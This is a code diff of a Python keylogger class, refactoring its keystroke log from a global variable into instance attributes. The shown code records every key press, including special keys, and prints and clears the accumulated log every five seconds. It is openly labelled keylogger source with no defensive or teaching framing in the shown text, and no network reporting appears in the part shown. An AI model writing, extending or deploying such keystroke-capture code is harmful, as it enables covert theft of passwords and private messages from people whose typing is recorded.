@@ -4,22 +4,29 @@ import threading
 
 log = ""
 class Keylogger:
+    def __init__(self):
+        self.log = ""
+    def append_to_log(self,string):
+        self.log = self.log + string
+
 
     def process_key_press(self,key):
-        global log
+
         try:
-            log =log +str(key.char)
+            current_key = str(key.char)
         except AttributeError:
             if key == key.space:
-                log = log + " "
+                current_key = " "
             else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
-                 log = log + " " + str(key) + " "
+
 
     def report(self):
-        global log
-        print(log)
-        log = ""
+
+        print(self.log)
+        self.log = ""
         timer = threading.Timer(5,self.report)
         timer.start()
     def start(self):
